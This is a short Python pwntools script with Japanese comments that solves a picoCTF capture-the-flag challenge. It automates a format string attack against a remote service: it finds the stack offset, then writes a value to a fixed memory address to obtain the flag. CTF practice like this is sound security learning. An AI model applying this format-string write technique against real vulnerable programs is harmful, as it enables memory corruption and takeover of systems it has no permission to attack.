
from pwn import *

# 設定
context.log_level = "critical"  # ログ出力を抑制
context.binary = ELF('./vuln')  # バイナリファイルを指定

# リモート接続
p = remote('rhea.picoctf.net', 64340)

# フォーマット文字列攻撃を実行する関数
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 64340)  # 再接続
    p.sendline(payload)  # ペイロードを送信
    return p.recvall()  # 全出力を受信

# フォーマット文字列攻撃の自動化
autofmt = FmtStr(exec_fmt)  # pwntoolsのFmtStrクラスを使用
offset = autofmt.offset     # オフセットを特定

# ペイロードの作成
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})  # 指定アドレスに値を書き込むペイロード

# ペイロードを送信
p.sendline(payload)

# フラグを取得
flag = p.recvall()
print("Flag: ", flag)
